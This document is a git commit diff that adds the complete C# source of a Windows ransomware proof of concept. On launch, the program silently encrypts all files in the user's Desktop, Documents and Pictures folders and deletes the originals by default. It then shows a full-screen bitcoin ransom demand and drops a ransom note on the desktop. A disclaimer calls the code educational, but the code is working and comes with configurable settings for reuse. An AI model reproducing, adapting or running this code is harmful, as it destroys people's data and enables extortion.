4576fdcef7dc537b176f92ab76d192b4ce316f90
Josh Madakor <josh.madakor@gmail.com>
2020-12-11 11:53:29 -0800

    Initial commit

---
+++ WindowsFormsApp1/Encrypter.Designer.cs
@@ -0,0 +1,183 @@
+﻿
+namespace RansomwarePOC
+{
+    partial class Form1
+    {
+        /// <summary>
+        /// Required designer variable.
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// Clean up any resources being used.
+        /// </summary>
+        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Windows Form Designer generated code
+
+        /// <summary>
+        /// Required method for Designer support - do not modify
+        /// the contents of this method with the code editor.
+        /// </summary>
+        private void InitializeComponent()
+        {
+            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Form1));
+            this.lblCount = new System.Windows.Forms.Label();
+            this.lblBitcoinAmount = new System.Windows.Forms.Label();
+            this.label2 = new System.Windows.Forms.Label();
+            this.txtBitcoinAddress = new System.Windows.Forms.TextBox();
+            this.txtEmailAddress = new System.Windows.Forms.TextBox();
+            this.label3 = new System.Windows.Forms.Label();
+            this.pictureBox1 = new System.Windows.Forms.PictureBox();
+            this.label5 = new System.Windows.Forms.Label();
+            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).BeginInit();
+            this.SuspendLayout();
+            // 
+            // lblCount
+            // 
+            this.lblCount.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left) 
+            | System.Windows.Forms.AnchorStyles.Right)));
+            this.lblCount.Font = new System.Drawing.Font("Microsoft Sans Serif", 27.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.lblCount.ForeColor = System.Drawing.Color.White;
+            this.lblCount.Location = new System.Drawing.Point(12, 425);
+            this.lblCount.Name = "lblCount";
+            this.lblCount.Size = new System.Drawing.Size(914, 55);
+            this.lblCount.TabIndex = 0;
+            this.lblCount.Text = "Your files (count: n) have been encrypted!";
+            this.lblCount.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
+            // 
+            // lblBitcoinAmount
+            // 
+            this.lblBitcoinAmount.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left) 
+            | System.Windows.Forms.AnchorStyles.Right)));
+            this.lblBitcoinAmount.Font = new System.Drawing.Font("Microsoft Sans Serif", 24F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.lblBitcoinAmount.ForeColor = System.Drawing.Color.White;
+            this.lblBitcoinAmount.Location = new System.Drawing.Point(12, 567);
+            this.lblBitcoinAmount.Name = "lblBitcoinAmount";
+            this.lblBitcoinAmount.Size = new System.Drawing.Size(914, 55);
+            this.lblBitcoinAmount.TabIndex = 1;
+            this.lblBitcoinAmount.Text = "Please send n Bitcoin(s) to the following BTC address:";
+            this.lblBitcoinAmount.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
+            // 
+            // label2
+            // 
+            this.label2.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left) 
+            | System.Windows.Forms.AnchorStyles.Right)));
+            this.label2.Font = new System.Drawing.Font("Microsoft Sans Serif", 24F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.label2.ForeColor = System.Drawing.Color.White;
+            this.label2.Location = new System.Drawing.Point(12, 672);
+            this.label2.Name = "label2";
+            this.label2.Size = new System.Drawing.Size(914, 55);
+            this.label2.TabIndex = 2;
+            this.label2.Text = "Next, E-mail your transaction ID to the following address:";
+            this.label2.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
+            // 
+            // txtBitcoinAddress
+            // 
+            this.txtBitcoinAddress.Anchor = System.Windows.Forms.AnchorStyles.Bottom;
+            this.txtBitcoinAddress.Font = new System.Drawing.Font("Microsoft Sans Serif", 24F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.txtBitcoinAddress.Location = new System.Drawing.Point(136, 625);
+            this.txtBitcoinAddress.Name = "txtBitcoinAddress";
+            this.txtBitcoinAddress.ReadOnly = true;
+            this.txtBitcoinAddress.Size = new System.Drawing.Size(677, 44);
+            this.txtBitcoinAddress.TabIndex = 3;
+            this.txtBitcoinAddress.Text = "1BtUL5dhVXHwKLqSdhjyjK9Pe64Vc6CEH1";
+            this.txtBitcoinAddress.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
+            // 
+            // txtEmailAddress
+            // 
+            this.txtEmailAddress.Anchor = System.Windows.Forms.AnchorStyles.Bottom;
+            this.txtEmailAddress.Font = new System.Drawing.Font("Microsoft Sans Serif", 24F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.txtEmailAddress.Location = new System.Drawing.Point(136, 730);
+            this.txtEmailAddress.Name = "txtEmailAddress";
+            this.txtEmailAddress.ReadOnly = true;
+            this.txtEmailAddress.Size = new System.Drawing.Size(677, 44);
+            this.txtEmailAddress.TabIndex = 4;
+            this.txtEmailAddress.Text = "friendly.cyber.criminal@gmail.com";
+            this.txtEmailAddress.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
+            // 
+            // label3
+            // 
+            this.label3.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left) 
+            | System.Windows.Forms.AnchorStyles.Right)));
+            this.label3.Font = new System.Drawing.Font("Microsoft Sans Serif", 27.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.label3.ForeColor = System.Drawing.Color.White;
+            this.label3.Location = new System.Drawing.Point(12, 480);
+            this.label3.Name = "label3";
+            this.label3.Size = new System.Drawing.Size(914, 87);
+            this.label3.TabIndex = 5;
+            this.label3.Text = "In order to recover your data...";
+            this.label3.TextAlign = System.Drawing.ContentAlignment.TopCenter;
+            // 
+            // pictureBox1
+            // 
+            this.pictureBox1.Anchor = ((System.Windows.Forms.AnchorStyles)((((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom) 
+            | System.Windows.Forms.AnchorStyles.Left) 
+            | System.Windows.Forms.AnchorStyles.Right)));
+            this.pictureBox1.Image = ((System.Drawing.Image)(resources.GetObject("pictureBox1.Image")));
+            this.pictureBox1.Location = new System.Drawing.Point(298, 12);
+            this.pictureBox1.Name = "pictureBox1";
+            this.pictureBox1.Size = new System.Drawing.Size(343, 386);
+            this.pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
+            this.pictureBox1.TabIndex = 6;
+            this.pictureBox1.TabStop = false;
+            // 
+            // label5
+            // 
+            this.label5.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left) 
+            | System.Windows.Forms.AnchorStyles.Right)));
+            this.label5.Font = new System.Drawing.Font("Microsoft Sans Serif", 24F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.label5.ForeColor = System.Drawing.Color.Crimson;
+            this.label5.Location = new System.Drawing.Point(12, 777);
+            this.label5.Name = "label5";
+            this.label5.Size = new System.Drawing.Size(914, 71);
+            this.label5.TabIndex = 8;
+            this.label5.Text = ".";
+            this.label5.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
+            // 
+            // Form1
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.BackColor = System.Drawing.Color.Crimson;
+            this.ClientSize = new System.Drawing.Size(938, 857);
+            this.Controls.Add(this.label5);
+            this.Controls.Add(this.label3);
+            this.Controls.Add(this.txtEmailAddress);
+            this.Controls.Add(this.txtBitcoinAddress);
+            this.Controls.Add(this.label2);
+            this.Controls.Add(this.lblBitcoinAmount);
+            this.Controls.Add(this.lblCount);
+            this.Controls.Add(this.pictureBox1);
+            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.SizableToolWindow;
+            this.Name = "Form1";
+            this.Text = "Lol";
+            this.WindowState = System.Windows.Forms.FormWindowState.Minimized;
+            this.Load += new System.EventHandler(this.Form1_Load);
+            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).EndInit();
+            this.ResumeLayout(false);
+            this.PerformLayout();
+
+        }
+
+        #endregion
+
+        private System.Windows.Forms.Label lblCount;
+        private System.Windows.Forms.Label lblBitcoinAmount;
+        private System.Windows.Forms.Label label2;
+        private System.Windows.Forms.TextBox txtBitcoinAddress;
+        private System.Windows.Forms.TextBox txtEmailAddress;
+        private System.Windows.Forms.Label label3;
+        private System.Windows.Forms.PictureBox pictureBox1;
+        private System.Windows.Forms.Label label5;
+    }
+}
+
---
+++ WindowsFormsApp1/Encrypter.cs
@@ -0,0 +1,272 @@
+﻿using System;
+using System.IO;
+using System.Security.Cryptography;
+using System.Windows.Forms;
+
+namespace RansomwarePOC
+{
+    public partial class Form1 : Form
+    {
+        /*
+         *  THIS IS A PROOF OF CONCEPT. DO NOT USE THIS TO COMMIT CRIME.
+         *  I AM NOT RESPONSIBLE FOR YOU DOING DUMB STUFF.
+         *  THIS SOURCE HAS BEEN USED AND MADE AVAILABLE
+         *  FOR PRESENTATION AND EDUCATIONAL PURPOSES. 
+         */
+
+
+
+        // ----------- EDIT THESE VARIABLES FOR YOUR OWN USE CASE ----------- //
+
+        private const bool DELETE_ALL_ORIGINALS = true; /* CAUTION */
+        private const bool ENCRYPT_DESKTOP = true;
+        private const bool ENCRYPT_DOCUMENTS = true;
+        private const bool ENCRYPT_PICTURES = true;
+        private const string ENCRYPTED_FILE_EXTENSION = ".jcrypt";
+        private const string ENCRYPT_PASSWORD = "Password1";
+        private const string BITCOIN_ADDRESS = "1BtUL5dhVXHwKLqSdhjyjK9Pe64Vc6CEH1";
+        private const string BITCOIN_RANSOM_AMOUNT = "1";
+        private const string EMAIL_ADDRESS = "this.email.address@gmail.com";
+
+        // ----------------------------- END -------------------------------- //
+        
+
+
+
+        private static string ENCRYPTION_LOG = "";
+        private string RANSOM_LETTER =
+           "All of your files have been encrypted.\n\n" +
+           "To unlock them, please send " + BITCOIN_RANSOM_AMOUNT + " bitcoin(s) to BTC address: " + BITCOIN_ADDRESS + "\n" +
+           "Afterwards, please email your transaction ID to: " + EMAIL_ADDRESS + "\n\n" +
+           "Thank you and have a nice day!\n\n" +
+           "Encryption Log:\n" +
+           "----------------------------------------\n";
+        private string DESKTOP_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);
+        private string DOCUMENTS_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
+        private string PICTURES_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);
+        private static int encryptedFileCount = 0;
+
+        public Form1()
+        {
+            InitializeComponent();
+        }
+
+        private void Form1_Load(object sender, EventArgs e)
+        {
+            initializeForm();
+
+            if (ENCRYPT_DESKTOP)
+            {
+                encryptFolderContents(DESKTOP_FOLDER);
+            }
+
+            if (ENCRYPT_PICTURES)
+            {
+                encryptFolderContents(PICTURES_FOLDER);
+            }
+
+            if (ENCRYPT_DOCUMENTS)
+            {
+                encryptFolderContents(DOCUMENTS_FOLDER);
+            }
+
+            if (encryptedFileCount > 0)
+            {
+                formatFormPostEncryption();
+                dropRansomLetter();
+            }
+            else
+            {
+                Console.Out.WriteLine("No files to encrypt.");
+                Application.Exit();
+            }
+        }
+
+        private void dropRansomLetter()
+        {
+            StreamWriter ransomWriter = new StreamWriter(DESKTOP_FOLDER + @"\___RECOVER__FILES__" + ENCRYPTED_FILE_EXTENSION + ".txt");
+            ransomWriter.WriteLine(RANSOM_LETTER);
+            ransomWriter.WriteLine(ENCRYPTION_LOG);
+            ransomWriter.Close();
+        }
+
+        private void formatFormPostEncryption()
+        {
+            this.Opacity = 100;
+            this.WindowState = FormWindowState.Maximized;
+            lblCount.Text = "Your files (count: " + encryptedFileCount + ") have been encrypted!";
+        }
+
+        private void initializeForm()
+        {
+            this.Opacity = 0;
+            this.ShowInTaskbar = false;
+            //this.WindowState = FormWindowState.Maximized;
+            lblBitcoinAmount.Text = "Please send " + BITCOIN_RANSOM_AMOUNT + " Bitcoin(s) to the following BTC address:";
+            txtBitcoinAddress.Text = BITCOIN_ADDRESS;
+            txtEmailAddress.Text = EMAIL_ADDRESS;
+            lblBitcoinAmount.Focus();
+        }
+
+        static void encryptFolderContents(string sDir)
+        {
+            try
+            {
+                foreach (string f in Directory.GetFiles(sDir))
+                {
+                    if (!f.Contains(ENCRYPTED_FILE_EXTENSION)) {
+                        Console.Out.WriteLine("Encrypting: " + f);
+                        FileEncrypt(f, ENCRYPT_PASSWORD);
+                    }
+                }
+
+                foreach (string d in Directory.GetDirectories(sDir))
+                {
+                    encryptFolderContents(d);
+                }
+            }
+            catch (System.Exception excpt)
+            {
+                Console.WriteLine(excpt.Message);
+            }
+        }
+
+        private static void FileEncrypt(string inputFile, string password)
+        {
+            //http://stackoverflow.com/questions/27645527/aes-encryption-on-large-files
+            //generate random salt
+            byte[] salt = GenerateRandomSalt();
+
+            //create output file name
+            FileStream fsCrypt = new FileStream(inputFile + ENCRYPTED_FILE_EXTENSION, FileMode.Create);
+
+            //convert password string to byte arrray
+            byte[] passwordBytes = System.Text.Encoding.UTF8.GetBytes(password);
+
+            //Set Rijndael symmetric encryption algorithm
+            RijndaelManaged AES = new RijndaelManaged();
+            AES.KeySize = 256;
+            AES.BlockSize = 128;
+            AES.Padding = PaddingMode.PKCS7;
+
+            //http://stackoverflow.com/questions/2659214/why-do-i-need-to-use-the-rfc2898derivebytes-class-in-net-instead-of-directly
+            //"What it does is repeatedly hash the user password along with the salt." High iteration counts.
+            var key = new Rfc2898DeriveBytes(passwordBytes, salt, 50000);
+            AES.Key = key.GetBytes(AES.KeySize / 8);
+            AES.IV = key.GetBytes(AES.BlockSize / 8);
+
+            //Cipher modes: http://security.stackexchange.com/questions/52665/which-is-the-best-cipher-mode-and-padding-mode-for-aes-encryption
+            AES.Mode = CipherMode.CBC;
+
+            // write salt to the begining of the output file, so in this case can be random every time
+            fsCrypt.Write(salt, 0, salt.Length);
+
+            CryptoStream cs = new CryptoStream(fsCrypt, AES.CreateEncryptor(), CryptoStreamMode.Write);
+
+            FileStream fsIn = new FileStream(inputFile, FileMode.Open);
+
+            //create a buffer (1mb) so only this amount will allocate in the memory and not the whole file
+            byte[] buffer = new byte[1048576];
+            int read;
+
+            try
+            {
+                while ((read = fsIn.Read(buffer, 0, buffer.Length)) > 0)
+                {
+                    //Application.DoEvents(); // -> for responsive GUI, using Task will be better!
+                    cs.Write(buffer, 0, read);
+                }
+
+                // Close up
+                fsIn.Close();
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("Error: " + ex.Message);
+            }
+            finally
+            {
+                ENCRYPTION_LOG += inputFile + "\n";
+                encryptedFileCount++;
+                cs.Close();
+                fsCrypt.Close();
+                if (DELETE_ALL_ORIGINALS)
+                {
+                    File.Delete(inputFile);
+                }
+            }
+        }
+
+        private static void FileDecrypt(string inputFile, string outputFile, string password)
+        {
+            byte[] passwordBytes = System.Text.Encoding.UTF8.GetBytes(password);
+            byte[] salt = new byte[32];
+
+            FileStream cryptoFileStream = new FileStream(inputFile, FileMode.Open);
+            cryptoFileStream.Read(salt, 0, salt.Length);
+
+            RijndaelManaged AES = new RijndaelManaged();
+            AES.KeySize = 256;
+            AES.BlockSize = 128;
+            var key = new Rfc2898DeriveBytes(passwordBytes, salt, 50000);
+            AES.Key = key.GetBytes(AES.KeySize / 8);
+            AES.IV = key.GetBytes(AES.BlockSize / 8);
+            AES.Padding = PaddingMode.PKCS7;
+            AES.Mode = CipherMode.CBC;
+
+            CryptoStream cryptoStream = new CryptoStream(cryptoFileStream, AES.CreateDecryptor(), CryptoStreamMode.Read);
+
+            FileStream fileStreamOutput = new FileStream(outputFile, FileMode.Create);
+
+            int read;
+            byte[] buffer = new byte[1048576];
+
+            try
+            {
+                while ((read = cryptoStream.Read(buffer, 0, buffer.Length)) > 0)
+                {
+                    //Application.DoEvents();
+                    fileStreamOutput.Write(buffer, 0, read);
+                }
+            }
+            catch (CryptographicException ex_CryptographicException)
+            {
+                Console.WriteLine("CryptographicException error: " + ex_CryptographicException.Message);
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("Error: " + ex.Message);
+            }
+
+            try
+            {
+                cryptoStream.Close();
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("Error by closing CryptoStream: " + ex.Message);
+            }
+            finally
+            {
+                fileStreamOutput.Close();
+                cryptoFileStream.Close();
+            }
+        }
+
+        public static byte[] GenerateRandomSalt()
+        {
+            byte[] data = new byte[32];
+
+            using (RNGCryptoServiceProvider rng = new RNGCryptoServiceProvider())
+            {
+                for (int i = 0; i < 10; i++)
+                {
+                    // Fille the buffer with the generated data
+                    rng.GetBytes(data);
+                }
+            }
+
+            return data;
+        }
+    }
+}
